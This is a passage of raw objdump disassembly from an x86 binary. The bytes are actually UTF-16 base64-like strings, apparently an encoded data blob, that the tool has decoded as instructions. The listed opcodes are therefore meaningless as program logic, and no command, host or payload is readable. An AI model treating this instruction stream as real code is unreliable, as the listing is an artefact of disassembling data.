  40b3a8:	4e                   	dec    %esi
  40b3a9:	00 4f 00             	add    %cl,0x0(%edi)
  40b3ac:	70 00                	jo     0x40b3ae
  40b3ae:	4d                   	dec    %ebp
  40b3af:	00 48 00             	add    %cl,0x0(%eax)
  40b3b2:	36 00 78 00          	add    %bh,%ss:0x0(%eax)
  40b3b6:	37                   	aaa
  40b3b7:	00 66 00             	add    %ah,0x0(%esi)
  40b3ba:	49                   	dec    %ecx
  40b3bb:	00 69 00             	add    %ch,0x0(%ecx)
  40b3be:	30 00                	xor    %al,(%eax)
  40b3c0:	73 00                	jae    0x40b3c2
  40b3c2:	37                   	aaa
  40b3c3:	00 75 00             	add    %dh,0x0(%ebp)
  40b3c6:	68 00 53 00 47       	push   $0x47005300
  40b3cb:	00 6f 00             	add    %ch,0x0(%edi)
  40b3ce:	43                   	inc    %ebx
  40b3cf:	00 75 00             	add    %dh,0x0(%ebp)
  40b3d2:	4d                   	dec    %ebp
  40b3d3:	00 65 00             	add    %ah,0x0(%ebp)
  40b3d6:	52                   	push   %edx
  40b3d7:	00 42 00             	add    %al,0x0(%edx)
  40b3da:	71 00                	jno    0x40b3dc
  40b3dc:	52                   	push   %edx
  40b3dd:	00 57 00             	add    %dl,0x0(%edi)
  40b3e0:	66 00 37             	data16 add %dh,(%edi)
  40b3e3:	00 5a 00             	add    %bl,0x0(%edx)
  40b3e6:	35 00 56 00 61       	xor    $0x61005600,%eax
  40b3eb:	00 6d 00             	add    %ch,0x0(%ebp)
  40b3ee:	61                   	popa
  40b3ef:	00 7a 00             	add    %bh,0x0(%edx)
  40b3f2:	53                   	push   %ebx
  40b3f3:	00 4d 00             	add    %cl,0x0(%ebp)
  40b3f6:	36 00 52 00          	add    %dl,%ss:0x0(%edx)
  40b3fa:	52                   	push   %edx
  40b3fb:	00 6f 00             	add    %ch,0x0(%edi)
  40b3fe:	48                   	dec    %eax
  40b3ff:	00 35 00 56 00 75    	add    %dh,0x75005600
  40b405:	00 6b 00             	add    %ch,0x0(%ebx)
  40b408:	78 00                	js     0x40b40a
  40b40a:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  40b40e:	46                   	inc    %esi
  40b40f:	00 4c 00 50          	add    %cl,0x50(%eax,%eax,1)
  40b413:	00 57 00             	add    %dl,0x0(%edi)
  40b416:	77 00                	ja     0x40b418
  40b418:	4a                   	dec    %edx
  40b419:	00 59 00             	add    %bl,0x0(%ecx)
  40b41c:	47                   	inc    %edi
  40b41d:	00 46 00             	add    %al,0x0(%esi)
  40b420:	74 00                	je     0x40b422
  40b422:	76 00                	jbe    0x40b424
  40b424:	47                   	inc    %edi
  40b425:	00 6b 00             	add    %ch,0x0(%ebx)
  40b428:	7a 00                	jp     0x40b42a
  40b42a:	7a 00                	jp     0x40b42c
  40b42c:	35 00 43 00 6f       	xor    $0x6f004300,%eax
  40b431:	00 58 00             	add    %bl,0x0(%eax)
  40b434:	43                   	inc    %ebx
  40b435:	00 7a 00             	add    %bh,0x0(%edx)
  40b438:	56                   	push   %esi
  40b439:	00 6d 00             	add    %ch,0x0(%ebp)
  40b43c:	6f                   	outsl  %ds:(%esi),(%dx)
  40b43d:	00 6c 00 4a          	add    %ch,0x4a(%eax,%eax,1)
  40b441:	00 71 00             	add    %dh,0x0(%ecx)
  40b444:	79 00                	jns    0x40b446
  40b446:	2b 00                	sub    (%eax),%eax
  40b448:	4c                   	dec    %esp
  40b449:	00 7a 00             	add    %bh,0x0(%edx)
  40b44c:	44                   	inc    %esp
  40b44d:	00 30                	add    %dh,(%eax)
  40b44f:	00 32                	add    %dh,(%edx)
  40b451:	00 68 00             	add    %ch,0x0(%eax)
  40b454:	39 00                	cmp    %eax,(%eax)
  40b456:	6b 00 61             	imul   $0x61,(%eax),%eax
  40b459:	00 38                	add    %bh,(%eax)
  40b45b:	00 70 00             	add    %dh,0x0(%eax)
  40b45e:	64 00 68 00          	add    %ch,%fs:0x0(%eax)
  40b462:	5a                   	pop    %edx
  40b463:	00 58 00             	add    %bl,0x0(%eax)
  40b466:	4f                   	dec    %edi
  40b467:	00 49 00             	add    %cl,0x0(%ecx)
  40b46a:	51                   	push   %ecx
  40b46b:	00 48 00             	add    %cl,0x0(%eax)
  40b46e:	6a 00                	push   $0x0
  40b470:	4f                   	dec    %edi
  40b471:	00 70 00             	add    %dh,0x0(%eax)
  40b474:	78 00                	js     0x40b476
  40b476:	59                   	pop    %ecx
  40b477:	00 50 00             	add    %dl,0x0(%eax)
  40b47a:	56                   	push   %esi
  40b47b:	00 33                	add    %dh,(%ebx)
  40b47d:	00 56 00             	add    %dl,0x0(%esi)
  40b480:	5a                   	pop    %edx
  40b481:	00 63 00             	add    %ah,0x0(%ebx)
  40b484:	4e                   	dec    %esi
  40b485:	00 6c 00 6e          	add    %ch,0x6e(%eax,%eax,1)
  40b489:	00 57 00             	add    %dl,0x0(%edi)
  40b48c:	37                   	aaa
  40b48d:	00 6d 00             	add    %ch,0x0(%ebp)
  40b490:	69 00 50 00 77 00    	imul   $0x770050,(%eax),%eax
  40b496:	57                   	push   %edi
  40b497:	00 41 00             	add    %al,0x0(%ecx)
  40b49a:	54                   	push   %esp
  40b49b:	00 5a 00             	add    %bl,0x0(%edx)
  40b49e:	57                   	push   %edi
  40b49f:	00 54 00 78          	add    %dl,0x78(%eax,%eax,1)
  40b4a3:	00 59 00             	add    %bl,0x0(%ecx)
  40b4a6:	2b 00                	sub    (%eax),%eax
  40b4a8:	6b 00 57             	imul   $0x57,(%eax),%eax
  40b4ab:	00 6f 00             	add    %ch,0x0(%edi)
  40b4ae:	72 00                	jb     0x40b4b0
  40b4b0:	79 00                	jns    0x40b4b2
  40b4b2:	6e                   	outsb  %ds:(%esi),(%dx)
  40b4b3:	00 54 00 30          	add    %dl,0x30(%eax,%eax,1)
  40b4b7:	00 36                	add    %dh,(%esi)
  40b4b9:	00 42 00             	add    %al,0x0(%edx)
  40b4bc:	6c                   	insb   (%dx),%es:(%edi)
  40b4bd:	00 45 00             	add    %al,0x0(%ebp)
  40b4c0:	44                   	inc    %esp
  40b4c1:	00 79 00             	add    %bh,0x0(%ecx)
  40b4c4:	64 00 76 00          	add    %dh,%fs:0x0(%esi)
  40b4c8:	66 00 41 00          	data16 add %al,0x0(%ecx)
  40b4cc:	31 00                	xor    %eax,(%eax)
  40b4ce:	51                   	push   %ecx
  40b4cf:	00 6b 00             	add    %ch,0x0(%ebx)
  40b4d2:	69 00 34 00 41 00    	imul   $0x410034,(%eax),%eax
  40b4d8:	6c                   	insb   (%dx),%es:(%edi)
  40b4d9:	00 33                	add    %dh,(%ebx)
  40b4db:	00 42 00             	add    %al,0x0(%edx)
  40b4de:	4f                   	dec    %edi
  40b4df:	00 39                	add    %bh,(%ecx)
  40b4e1:	00 74 00 59          	add    %dh,0x59(%eax,%eax,1)
  40b4e5:	00 69 00             	add    %ch,0x0(%ecx)
  40b4e8:	75 00                	jne    0x40b4ea
  40b4ea:	36 00 42 00          	add    %al,%ss:0x0(%edx)
  40b4ee:	32 00                	xor    (%eax),%al
  40b4f0:	34 00                	xor    $0x0,%al
  40b4f2:	4c                   	dec    %esp
  40b4f3:	00 2b                	add    %ch,(%ebx)
  40b4f5:	00 64 00 45          	add    %ah,0x45(%eax,%eax,1)
  40b4f9:	00 58 00             	add    %bl,0x0(%eax)
  40b4fc:	63 00                	arpl   %eax,(%eax)
  40b4fe:	66 00 78 00          	data16 add %bh,0x0(%eax)
  40b502:	68 00 6e 00 76       	push   $0x76006e00
  40b507:	00 36                	add    %dh,(%esi)
  40b509:	00 4d 00             	add    %cl,0x0(%ebp)
  40b50c:	77 00                	ja     0x40b50e
  40b50e:	53                   	push   %ebx
  40b50f:	00 6e 00             	add    %ch,0x0(%esi)
  40b512:	51                   	push   %ecx
  40b513:	00 6a 00             	add    %ch,0x0(%edx)
  40b516:	66 00 6b 00          	data16 add %ch,0x0(%ebx)
  40b51a:	35 00 58 00 34       	xor    $0x34005800,%eax
  40b51f:	00 32                	add    %dh,(%edx)
  40b521:	00 79 00             	add    %bh,0x0(%ecx)
  40b524:	34 00                	xor    $0x0,%al
  40b526:	53                   	push   %ebx
  40b527:	00 37                	add    %dh,(%edi)
  40b529:	00 48 00             	add    %cl,0x0(%eax)
  40b52c:	38 00                	cmp    %al,(%eax)
  40b52e:	65 00 38             	add    %bh,%gs:(%eax)
  40b531:	00 74 00 68          	add    %dh,0x68(%eax,%eax,1)
  40b535:	00 52 00             	add    %dl,0x0(%edx)
  40b538:	6b 00 63             	imul   $0x63,(%eax),%eax
  40b53b:	00 73 00             	add    %dh,0x0(%ebx)
  40b53e:	75 00                	jne    0x40b540
  40b540:	6c                   	insb   (%dx),%es:(%edi)
  40b541:	00 33                	add    %dh,(%ebx)
  40b543:	00 41 00             	add    %al,0x0(%ecx)
  40b546:	73 00                	jae    0x40b548
  40b548:	4a                   	dec    %edx
  40b549:	00 74 00 47          	add    %dh,0x47(%eax,%eax,1)
  40b54d:	00 69 00             	add    %ch,0x0(%ecx)
  40b550:	6d                   	insl   (%dx),%es:(%edi)
  40b551:	00 4e 00             	add    %cl,0x0(%esi)
  40b554:	76 00                	jbe    0x40b556
  40b556:	73 00                	jae    0x40b558
  40b558:	52                   	push   %edx
  40b559:	00 33                	add    %dh,(%ebx)
  40b55b:	00 46 00             	add    %al,0x0(%esi)
  40b55e:	77 00                	ja     0x40b560
  40b560:	6b 00 63             	imul   $0x63,(%eax),%eax
  40b563:	00 71 00             	add    %dh,0x0(%ecx)
  40b566:	64 00 48 00          	add    %cl,%fs:0x0(%eax)
  40b56a:	44                   	inc    %esp
  40b56b:	00 37                	add    %dh,(%edi)
  40b56d:	00 54 00 36          	add    %dl,0x36(%eax,%eax,1)
  40b571:	00 42 00             	add    %al,0x0(%edx)
  40b574:	2f                   	das
  40b575:	00 33                	add    %dh,(%ebx)
  40b577:	00 7a 00             	add    %bh,0x0(%edx)
  40b57a:	53                   	push   %ebx
  40b57b:	00 2f                	add    %ch,(%edi)
  40b57d:	00 37                	add    %dh,(%edi)
  40b57f:	00 32                	add    %dh,(%edx)
  40b581:	00 61 00             	add    %ah,0x0(%ecx)
  40b584:	72 00                	jb     0x40b586
  40b586:	50                   	push   %eax
  40b587:	00 35 00 48 00 6c    	add    %dh,0x6c004800
  40b58d:	00 6e 00             	add    %ch,0x0(%esi)
  40b590:	47                   	inc    %edi
  40b591:	00 35 00 4b 00 49    	add    %dh,0x49004b00
  40b597:	00 7a 00             	add    %bh,0x0(%edx)
  40b59a:	70 00                	jo     0x40b59c
  40b59c:	39 00                	cmp    %eax,(%eax)
  40b59e:	65 00 79 00          	add    %bh,%gs:0x0(%ecx)
  40b5a2:	32 00                	xor    (%eax),%al
  40b5a4:	6a 00                	push   $0x0
  40b5a6:	4e                   	dec    %esi
  40b5a7:	00 74 00 34          	add    %dh,0x34(%eax,%eax,1)
  40b5ab:	00 4e 00             	add    %cl,0x0(%esi)
  40b5ae:	6e                   	outsb  %ds:(%esi),(%dx)
  40b5af:	00 70 00             	add    %dh,0x0(%eax)
  40b5b2:	79 00                	jns    0x40b5b4
  40b5b4:	58                   	pop    %eax
  40b5b5:	00 62 00             	add    %ah,0x0(%edx)
  40b5b8:	50                   	push   %eax
  40b5b9:	00 6e 00             	add    %ch,0x0(%esi)
  40b5bc:	61                   	popa
  40b5bd:	00 48 00             	add    %cl,0x0(%eax)
  40b5c0:	6c                   	insb   (%dx),%es:(%edi)
  40b5c1:	00 70 00             	add    %dh,0x0(%eax)
  40b5c4:	4d                   	dec    %ebp
  40b5c5:	00 70 00             	add    %dh,0x0(%eax)
  40b5c8:	6c                   	insb   (%dx),%es:(%edi)
  40b5c9:	00 4c 00 6a          	add    %cl,0x6a(%eax,%eax,1)
  40b5cd:	00 47 00             	add    %al,0x0(%edi)
  40b5d0:	32 00                	xor    (%eax),%al
  40b5d2:	69 00 66 00 6e 00    	imul   $0x6e0066,(%eax),%eax
  40b5d8:	33 00                	xor    (%eax),%eax
  40b5da:	55                   	push   %ebp
  40b5db:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b5de:	4d                   	dec    %ebp
  40b5df:	00 46 00             	add    %al,0x0(%esi)
  40b5e2:	67 00 73 00          	add    %dh,0x0(%bp,%di)
  40b5e6:	49                   	dec    %ecx
  40b5e7:	00 70 00             	add    %dh,0x0(%eax)
  40b5ea:	6c                   	insb   (%dx),%es:(%edi)
  40b5eb:	00 69 00             	add    %ch,0x0(%ecx)
  40b5ee:	67 00 62 00          	add    %ah,0x0(%bp,%si)
  40b5f2:	33 00                	xor    (%eax),%eax
  40b5f4:	69 00 46 00 73 00    	imul   $0x730046,(%eax),%eax
  40b5fa:	57                   	push   %edi
  40b5fb:	00 4f 00             	add    %cl,0x0(%edi)
  40b5fe:	51                   	push   %ecx
  40b5ff:	00 44 00 76          	add    %al,0x76(%eax,%eax,1)
  40b603:	00 71 00             	add    %dh,0x0(%ecx)
  40b606:	57                   	push   %edi
  40b607:	00 4b 00             	add    %cl,0x0(%ebx)
  40b60a:	61                   	popa
  40b60b:	00 71 00             	add    %dh,0x0(%ecx)
  40b60e:	74 00                	je     0x40b610
  40b610:	56                   	push   %esi
  40b611:	00 63 00             	add    %ah,0x0(%ebx)
  40b614:	34 00                	xor    $0x0,%al
  40b616:	36 00 30             	add    %dh,%ss:(%eax)
  40b619:	00 50 00             	add    %dl,0x0(%eax)
  40b61c:	38 00                	cmp    %al,(%eax)
  40b61e:	31 00                	xor    %eax,(%eax)
  40b620:	59                   	pop    %ecx
  40b621:	00 31                	add    %dh,(%ecx)
  40b623:	00 44 00 76          	add    %al,0x76(%eax,%eax,1)
  40b627:	00 4b 00             	add    %cl,0x0(%ebx)
  40b62a:	70 00                	jo     0x40b62c
  40b62c:	55                   	push   %ebp
  40b62d:	00 4c 00 39          	add    %cl,0x39(%eax,%eax,1)
  40b631:	00 56 00             	add    %dl,0x0(%esi)
  40b634:	52                   	push   %edx
  40b635:	00 48 00             	add    %cl,0x0(%eax)
  40b638:	2b 00                	sub    (%eax),%eax
  40b63a:	50                   	push   %eax
  40b63b:	00 6a 00             	add    %ch,0x0(%edx)
  40b63e:	49                   	dec    %ecx
  40b63f:	00 5a 00             	add    %bl,0x0(%edx)
  40b642:	52                   	push   %edx
  40b643:	00 6f 00             	add    %ch,0x0(%edi)
  40b646:	49                   	dec    %ecx
  40b647:	00 46 00             	add    %al,0x0(%esi)
  40b64a:	78 00                	js     0x40b64c
  40b64c:	2b 00                	sub    (%eax),%eax
  40b64e:	48                   	dec    %eax
  40b64f:	00 39                	add    %bh,(%ecx)
  40b651:	00 44 00 45          	add    %al,0x45(%eax,%eax,1)
  40b655:	00 61 00             	add    %ah,0x0(%ecx)
  40b658:	58                   	pop    %eax
  40b659:	00 32                	add    %dh,(%edx)
  40b65b:	00 35 00 61 00 42    	add    %dh,0x42006100
  40b661:	00 58 00             	add    %bl,0x0(%eax)
  40b664:	68 00 56 00 76       	push   $0x76005600
  40b669:	00 38                	add    %bh,(%eax)
  40b66b:	00 43 00             	add    %al,0x0(%ebx)
  40b66e:	33 00                	xor    (%eax),%eax
  40b670:	51                   	push   %ecx
  40b671:	00 41 00             	add    %al,0x0(%ecx)
  40b674:	3d 00 00 87 b1       	cmp    $0xb1870000,%eax
  40b679:	69 00 52 00 4f 00    	imul   $0x4f0052,(%eax),%eax
  40b67f:	66 00 67 00          	data16 add %ah,0x0(%edi)
  40b683:	4c                   	dec    %esp
  40b684:	00 64 00 6f          	add    %ah,0x6f(%eax,%eax,1)
  40b688:	00 35 00 53 00 54    	add    %dh,0x54005300
  40b68e:	00 6b 00             	add    %ch,0x0(%ebx)
  40b691:	35 00 68 00 76       	xor    $0x76006800,%eax
  40b696:	00 51 00             	add    %dl,0x0(%ecx)
  40b699:	6e                   	outsb  %ds:(%esi),(%dx)
  40b69a:	00 56 00             	add    %dl,0x0(%esi)
  40b69d:	44                   	inc    %esp
  40b69e:	00 39                	add    %bh,(%ecx)
  40b6a0:	00 41 00             	add    %al,0x0(%ecx)
  40b6a3:	44                   	inc    %esp
  40b6a4:	00 4c 00 51          	add    %cl,0x51(%eax,%eax,1)
  40b6a8:	00 72 00             	add    %dh,0x0(%edx)
  40b6ab:	71 00                	jno    0x40b6ad
  40b6ad:	41                   	inc    %ecx
  40b6ae:	00 69 00             	add    %ch,0x0(%ecx)
  40b6b1:	4d                   	dec    %ebp
  40b6b2:	00 6f 00             	add    %ch,0x0(%edi)
  40b6b5:	49                   	dec    %ecx
  40b6b6:	00 54 00 76          	add    %dl,0x76(%eax,%eax,1)
  40b6ba:	00 48 00             	add    %cl,0x0(%eax)
  40b6bd:	42                   	inc    %edx
  40b6be:	00 43 00             	add    %al,0x0(%ebx)
  40b6c1:	56                   	push   %esi
  40b6c2:	00 45 00             	add    %al,0x0(%ebp)
  40b6c5:	4b                   	dec    %ebx
  40b6c6:	00 77 00             	add    %dh,0x0(%edi)
  40b6c9:	63 00                	arpl   %eax,(%eax)
  40b6cb:	68 00 79 00 4b       	push   $0x4b007900
  40b6d0:	00 57 00             	add    %dl,0x0(%edi)
  40b6d3:	61                   	popa
  40b6d4:	00 6e 00             	add    %ch,0x0(%esi)
  40b6d7:	58                   	pop    %eax
  40b6d8:	00 56 00             	add    %dl,0x0(%esi)
  40b6db:	7a 00                	jp     0x40b6dd
  40b6dd:	39 00                	cmp    %eax,(%eax)
  40b6df:	2b 00                	sub    (%eax),%eax
  40b6e1:	36 00 6c 00 38       	add    %ch,%ss:0x38(%eax,%eax,1)
  40b6e6:	00 6f 00             	add    %ch,0x0(%edi)
  40b6e9:	63 00                	arpl   %eax,(%eax)
  40b6eb:	4f                   	dec    %edi
  40b6ec:	00 39                	add    %bh,(%ecx)
  40b6ee:	00 62 00             	add    %ah,0x0(%edx)
  40b6f1:	55                   	push   %ebp
  40b6f2:	00 61 00             	add    %ah,0x0(%ecx)
  40b6f5:	35 00 45 00 6d       	xor    $0x6d004500,%eax
  40b6fa:	00 4d 00             	add    %cl,0x0(%ebp)
  40b6fd:	72 00                	jb     0x40b6ff
  40b6ff:	36 00 79 00          	add    %bh,%ss:0x0(%ecx)
  40b703:	57                   	push   %edi
  40b704:	00 6d 00             	add    %ch,0x0(%ebp)
  40b707:	6f                   	outsl  %ds:(%esi),(%dx)
  40b708:	00 5a 00             	add    %bl,0x0(%edx)
  40b70b:	69 00 38 00 6e 00    	imul   $0x6e0038,(%eax),%eax
  40b711:	4a                   	dec    %edx
  40b712:	00 2f                	add    %ch,(%edi)
  40b714:	00 76 00             	add    %dh,0x0(%esi)
  40b717:	6b 00 5a             	imul   $0x5a,(%eax),%eax
  40b71a:	00 38                	add    %bh,(%eax)
  40b71c:	00 79 00             	add    %bh,0x0(%ecx)
  40b71f:	32 00                	xor    (%eax),%al
  40b721:	50                   	push   %eax
  40b722:	00 6a 00             	add    %ch,0x0(%edx)
  40b725:	4f                   	dec    %edi
  40b726:	00 41 00             	add    %al,0x0(%ecx)
  40b729:	30 00                	xor    %al,(%eax)
  40b72b:	38 00                	cmp    %al,(%eax)
  40b72d:	53                   	push   %ebx
  40b72e:	00 6a 00             	add    %ch,0x0(%edx)
  40b731:	44                   	inc    %esp
  40b732:	00 56 00             	add    %dl,0x0(%esi)
  40b735:	58                   	pop    %eax
  40b736:	00 4d 00             	add    %cl,0x0(%ebp)
  40b739:	62 00                	bound  %eax,(%eax)
  40b73b:	64 00 71 00          	add    %dh,%fs:0x0(%ecx)
  40b73f:	68 00 41 00 4f       	push   $0x4f004100
  40b744:	00 35 00 6d 00 59    	add    %dh,0x59006d00
  40b74a:	00 49 00             	add    %cl,0x0(%ecx)
  40b74d:	33 00                	xor    (%eax),%eax
  40b74f:	67 00 77 00          	add    %dh,0x0(%bx)
  40b753:	45                   	inc    %ebp
  40b754:	00 36                	add    %dh,(%esi)
  40b756:	00 4d 00             	add    %cl,0x0(%ebp)
  40b759:	58                   	pop    %eax
  40b75a:	00 4e 00             	add    %cl,0x0(%esi)
  40b75d:	4e                   	dec    %esi
  40b75e:	00 55 00             	add    %dl,0x0(%ebp)
  40b761:	69 00 32 00 79 00    	imul   $0x790032,(%eax),%eax
  40b767:	2f                   	das
  40b768:	00 75 00             	add    %dh,0x0(%ebp)
  40b76b:	62 00                	bound  %eax,(%eax)
  40b76d:	45                   	inc    %ebp
  40b76e:	00 6d 00             	add    %ch,0x0(%ebp)
  40b771:	49                   	dec    %ecx
  40b772:	00 4a 00             	add    %cl,0x0(%edx)
  40b775:	44                   	inc    %esp
  40b776:	00 68 00             	add    %ch,0x0(%eax)
  40b779:	68 00 75 00 70       	push   $0x70007500
  40b77e:	00 43 00             	add    %al,0x0(%ebx)
  40b781:	4f                   	dec    %edi
  40b782:	00 78 00             	add    %bh,0x0(%eax)
  40b785:	46                   	inc    %esi
  40b786:	00 36                	add    %dh,(%esi)
  40b788:	00 33                	add    %dh,(%ebx)
  40b78a:	00 41 00             	add    %al,0x0(%ecx)
  40b78d:	36 00 7a 00          	add    %bh,%ss:0x0(%edx)
  40b791:	4b                   	dec    %ebx
  40b792:	00 2b                	add    %ch,(%ebx)
  40b794:	00 56 00             	add    %dl,0x0(%esi)
  40b797:	6b 00 62             	imul   $0x62,(%eax),%eax
  40b79a:	00 4d 00             	add    %cl,0x0(%ebp)
  40b79d:	2b 00                	sub    (%eax),%eax
  40b79f:	46                   	inc    %esi
  40b7a0:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b7a3:	34 00                	xor    $0x0,%al
  40b7a5:	37                   	aaa
  40b7a6:	00 46 00             	add    %al,0x0(%esi)
  40b7a9:	62 00                	bound  %eax,(%eax)
  40b7ab:	78 00                	js     0x40b7ad
  40b7ad:	4f                   	dec    %edi
  40b7ae:	00 5a 00             	add    %bl,0x0(%edx)
  40b7b1:	62 00                	bound  %eax,(%eax)
  40b7b3:	56                   	push   %esi
  40b7b4:	00 69 00             	add    %ch,0x0(%ecx)
  40b7b7:	2b 00                	sub    (%eax),%eax
  40b7b9:	45                   	inc    %ebp
  40b7ba:	00 31                	add    %dh,(%ecx)
  40b7bc:	00 76 00             	add    %dh,0x0(%esi)
  40b7bf:	54                   	push   %esp
  40b7c0:	00 64 00 55          	add    %ah,0x55(%eax,%eax,1)
  40b7c4:	00 79 00             	add    %bh,0x0(%ecx)
  40b7c7:	70 00                	jo     0x40b7c9
  40b7c9:	46                   	inc    %esi
  40b7ca:	00 75 00             	add    %dh,0x0(%ebp)
  40b7cd:	39 00                	cmp    %eax,(%eax)
  40b7cf:	4b                   	dec    %ebx
  40b7d0:	00 58 00             	add    %bl,0x0(%eax)
  40b7d3:	67 00 58 00          	add    %bl,0x0(%bx,%si)
  40b7d7:	38 00                	cmp    %al,(%eax)
  40b7d9:	61                   	popa
  40b7da:	00 69 00             	add    %ch,0x0(%ecx)
  40b7dd:	30 00                	xor    %al,(%eax)
  40b7df:	48                   	dec    %eax
  40b7e0:	00 57 00             	add    %dl,0x0(%edi)
  40b7e3:	61                   	popa
  40b7e4:	00 69 00             	add    %ch,0x0(%ecx)
  40b7e7:	45                   	inc    %ebp
  40b7e8:	00 41 00             	add    %al,0x0(%ecx)
  40b7eb:	4a                   	dec    %edx
  40b7ec:	00 79 00             	add    %bh,0x0(%ecx)
  40b7ef:	50                   	push   %eax
  40b7f0:	00 6c 00 62          	add    %ch,0x62(%eax,%eax,1)
  40b7f4:	00 32                	add    %dh,(%edx)
  40b7f6:	00 78 00             	add    %bh,0x0(%eax)
  40b7f9:	50                   	push   %eax
  40b7fa:	00 50 00             	add    %dl,0x0(%eax)
  40b7fd:	33 00                	xor    (%eax),%eax
  40b7ff:	79 00                	jns    0x40b801
  40b801:	66 00 59 00          	data16 add %bl,0x0(%ecx)
  40b805:	5a                   	pop    %edx
  40b806:	00 44 00 57          	add    %al,0x57(%eax,%eax,1)
  40b80a:	00 6a 00             	add    %ch,0x0(%edx)
  40b80d:	4a                   	dec    %edx
  40b80e:	00 2b                	add    %ch,(%ebx)
  40b810:	00 45 00             	add    %al,0x0(%ebp)
  40b813:	58                   	pop    %eax
  40b814:	00 30                	add    %dh,(%eax)
  40b816:	00 56 00             	add    %dl,0x0(%esi)
  40b819:	57                   	push   %edi
  40b81a:	00 58 00             	add    %bl,0x0(%eax)
  40b81d:	54                   	push   %esp
  40b81e:	00 6d 00             	add    %ch,0x0(%ebp)
  40b821:	76 00                	jbe    0x40b823
  40b823:	55                   	push   %ebp
  40b824:	00 5a 00             	add    %bl,0x0(%edx)
  40b827:	31 00                	xor    %eax,(%eax)
  40b829:	42                   	inc    %edx
  40b82a:	00 62 00             	add    %ah,0x0(%edx)
  40b82d:	42                   	inc    %edx
  40b82e:	00 70 00             	add    %dh,0x0(%eax)
  40b831:	4c                   	dec    %esp
  40b832:	00 6f 00             	add    %ch,0x0(%edi)
  40b835:	2f                   	das
  40b836:	00 45 00             	add    %al,0x0(%ebp)
  40b839:	5a                   	pop    %edx
  40b83a:	00 39                	add    %bh,(%ecx)
  40b83c:	00 33                	add    %dh,(%ebx)
  40b83e:	00 4a 00             	add    %cl,0x0(%edx)
  40b841:	36 00 76 00          	add    %dh,%ss:0x0(%esi)
  40b845:	67 00 6f 00          	add    %ch,0x0(%bx)
  40b849:	48                   	dec    %eax
  40b84a:	00 52 00             	add    %dl,0x0(%edx)
  40b84d:	4c                   	dec    %esp
  40b84e:	00 62 00             	add    %ah,0x0(%edx)
  40b851:	51                   	push   %ecx
  40b852:	00 2f                	add    %ch,(%edi)
  40b854:	00 47 00             	add    %al,0x0(%edi)
  40b857:	6f                   	outsl  %ds:(%esi),(%dx)
  40b858:	00 49 00             	add    %cl,0x0(%ecx)
  40b85b:	77 00                	ja     0x40b85d
  40b85d:	67 00 6a 00          	add    %ch,0x0(%bp,%si)
  40b861:	38 00                	cmp    %al,(%eax)
  40b863:	45                   	inc    %ebp
  40b864:	00 45 00             	add    %al,0x0(%ebp)
  40b867:	57                   	push   %edi
  40b868:	00 49 00             	add    %cl,0x0(%ecx)
  40b86b:	55                   	push   %ebp
  40b86c:	00 52 00             	add    %dl,0x0(%edx)
  40b86f:	36 00 71 00          	add    %dh,%ss:0x0(%ecx)
  40b873:	4b                   	dec    %ebx
  40b874:	00 36                	add    %dh,(%esi)
  40b876:	00 63 00             	add    %ah,0x0(%ebx)
  40b879:	49                   	dec    %ecx
  40b87a:	00 31                	add    %dh,(%ecx)
  40b87c:	00 44 00 6f          	add    %al,0x6f(%eax,%eax,1)
  40b880:	00 67 00             	add    %ah,0x0(%edi)
  40b883:	78 00                	js     0x40b885
  40b885:	34 00                	xor    $0x0,%al
  40b887:	38 00                	cmp    %al,(%eax)
  40b889:	64 00 47 00          	add    %al,%fs:0x0(%edi)
  40b88d:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  40b891:	6d                   	insl   (%dx),%es:(%edi)
  40b892:	00 72 00             	add    %dh,0x0(%edx)
  40b895:	4a                   	dec    %edx
  40b896:	00 66 00             	add    %ah,0x0(%esi)
  40b899:	38 00                	cmp    %al,(%eax)
  40b89b:	43                   	inc    %ebx
  40b89c:	00 35 00 38 00 61    	add    %dh,0x61003800
  40b8a2:	00 50 00             	add    %dl,0x0(%eax)
  40b8a5:	70 00                	jo     0x40b8a7
  40b8a7:	39 00                	cmp    %eax,(%eax)
  40b8a9:	4a                   	dec    %edx
  40b8aa:	00 68 00             	add    %ch,0x0(%eax)
  40b8ad:	69 00 78 00 52 00    	imul   $0x520078,(%eax),%eax
  40b8b3:	31 00                	xor    %eax,(%eax)
  40b8b5:	75 00                	jne    0x40b8b7
  40b8b7:	6e                   	outsb  %ds:(%esi),(%dx)
  40b8b8:	00 73 00             	add    %dh,0x0(%ebx)
  40b8bb:	2f                   	das
  40b8bc:	00 62 00             	add    %ah,0x0(%edx)
  40b8bf:	50                   	push   %eax
  40b8c0:	00 63 00             	add    %ah,0x0(%ebx)
  40b8c3:	44                   	inc    %esp
  40b8c4:	00 6e 00             	add    %ch,0x0(%esi)
  40b8c7:	49                   	dec    %ecx
  40b8c8:	00 49 00             	add    %cl,0x0(%ecx)
  40b8cb:	63 00                	arpl   %eax,(%eax)
  40b8cd:	63 00                	arpl   %eax,(%eax)
  40b8cf:	6b 00 4b             	imul   $0x4b,(%eax),%eax
  40b8d2:	00 54 00 75          	add    %dl,0x75(%eax,%eax,1)
  40b8d6:	00 72 00             	add    %dh,0x0(%edx)
  40b8d9:	2b 00                	sub    (%eax),%eax
  40b8db:	4b                   	dec    %ebx
  40b8dc:	00 69 00             	add    %ch,0x0(%ecx)
  40b8df:	57                   	push   %edi
  40b8e0:	00 79 00             	add    %bh,0x0(%ecx)
  40b8e3:	70 00                	jo     0x40b8e5
  40b8e5:	47                   	inc    %edi
  40b8e6:	00 35 00 64 00 49    	add    %dh,0x49006400
  40b8ec:	00 4b 00             	add    %cl,0x0(%ebx)
  40b8ef:	6f                   	outsl  %ds:(%esi),(%dx)
  40b8f0:	00 44 00 4f          	add    %al,0x4f(%eax,%eax,1)
  40b8f4:	00 61 00             	add    %ah,0x0(%ecx)
  40b8f7:	53                   	push   %ebx
  40b8f8:	00 4e 00             	add    %cl,0x0(%esi)
  40b8fb:	54                   	push   %esp
  40b8fc:	00 70 00             	add    %dh,0x0(%eax)
  40b8ff:	2b 00                	sub    (%eax),%eax
  40b901:	33 00                	xor    (%eax),%eax
  40b903:	68 00 30 00 4f       	push   $0x4f003000
  40b908:	00 4c 00 6b          	add    %cl,0x6b(%eax,%eax,1)
  40b90c:	00 78 00             	add    %bh,0x0(%eax)
  40b90f:	47                   	inc    %edi
  40b910:	00 5a 00             	add    %bl,0x0(%edx)
  40b913:	70 00                	jo     0x40b915
